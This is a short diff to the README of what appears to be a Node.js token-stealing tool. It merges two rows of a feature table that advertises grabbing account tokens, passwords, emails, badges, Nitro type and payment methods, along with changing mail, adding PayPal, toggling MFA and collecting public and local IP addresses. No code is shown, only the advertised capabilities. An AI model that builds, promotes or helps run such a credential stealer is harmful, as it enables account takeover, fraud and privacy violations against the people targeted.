@@ -60,8 +60,7 @@ node index.js
 | `PAYPAL`                | Add paypal           | ✅        |
 | `GMAIL`                | Change mail           | ✅        |
 | `MFA2`                | Enabled or Disabled of MFA2           | ✅        |
-| `TOKEN`                | Take all the initiated TOKENS           | ✅        |
-| `TOKEN`                | Takes all the INFO about the TOKENS           | ✅        |
+| `TOKEN`                | Take all the initiated TOKENS and Takes all the INFO about the TOKENS          | ✅        |
 |                 | (Token, Badge(s), Email(s), Password(s), Nitro Type, Payment Methods and more...)           | ✅        |
 | `IP`                | Takes IP address (public)           | ✅        |
 | `IP LOCAL`                | Takes IP address (Local)           | ✅        |
